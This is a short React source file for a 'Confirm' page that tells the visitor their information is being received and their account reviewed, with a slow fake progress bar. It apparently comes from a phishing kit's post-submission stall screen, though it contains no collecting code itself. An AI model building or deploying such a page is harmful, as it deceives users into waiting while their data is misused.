import React, { useState, useEffect} from "react";
import Nav from "../component/nav";

export default function Confirm() {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    setInterval(() => {
        setProgress(prevProgress => {
        if (prevProgress < 9000) {
            return prevProgress + (100 / 60); // Update the progress every second
        } else {
            return prevProgress;
        }
        });
    }, 1000);
  }, []);
  return (
    <>
      <div className="w-screen h-screen bg-[#dbdee2] flex" style={{padding: '25px', color: 'grey'}}>
        <Nav />
        <main className="container max-w-[584px] px-[12px] bg-white rounded-md" style={{margin: 'auto'}}>
          <img src="ref.png" className="w-100 mr-2" alt="Logo" style={{height: '120px', margin: 'auto'}}/>
          <p className="text-base  leading-6 text-[#212529]">
            Hi, We are receiving your information.
          </p>
          <p className="text-base  leading-6 text-[#212529] my-[14px]">
            Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account.
          </p>

          <p className="text-base  leading-6 text-[#212529] my-[14px]">
            Please wait, this could take up to 10-20 minutes, please be patient while we review your case...
          </p>

          <div style={{paddingTop:'10px', paddingBottom: '10px'}}>
              <progress value={progress} max="9000" style={{width:'100%', backgroundColor:'#fff'}}></progress>
          </div>
        </main>
      </div>
    </>
  );
}
